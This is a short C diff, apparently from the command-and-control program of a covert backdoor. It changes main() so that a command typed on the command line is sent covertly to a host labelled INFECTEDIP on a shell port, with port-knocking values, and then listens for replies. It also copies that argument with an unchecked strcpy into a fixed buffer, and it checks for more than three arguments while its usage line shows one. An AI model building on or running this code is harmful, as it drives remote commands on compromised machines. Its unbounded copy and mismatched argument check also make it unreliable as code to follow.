@@ -6,14 +6,20 @@ int main(int argc, char **argv){
     char *dip = INFECTEDIP;
     unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
-    unsigned char data[BUFSIZE] = "echo hi";
-    pattern[0] = 14881; //port 8506 in u_short
-    pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
-    knocking[0] = 0; // initilizing the knocking
-    knocking[1] = 0;
+    unsigned char data[BUFSIZE];
+    if(argc > 3){
+        strcpy(data, argv[1]);
+        pattern[0] = 14881; //port 8506 in u_short
+        pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
+        knocking[0] = 0; // initilizing the knocking
+        knocking[1] = 0;
+        printf("command: %s", data);
+        covert_send(sip, dip, sport, dport, data, 0);
+        Packetcapture();
+    } else {
+        printf("Usage ./cnc [command]\n");
+    }
 
-    covert_send(sip, dip, sport, dport, data, 0);
-    Packetcapture();
     exit(1);
     return 0;
 }
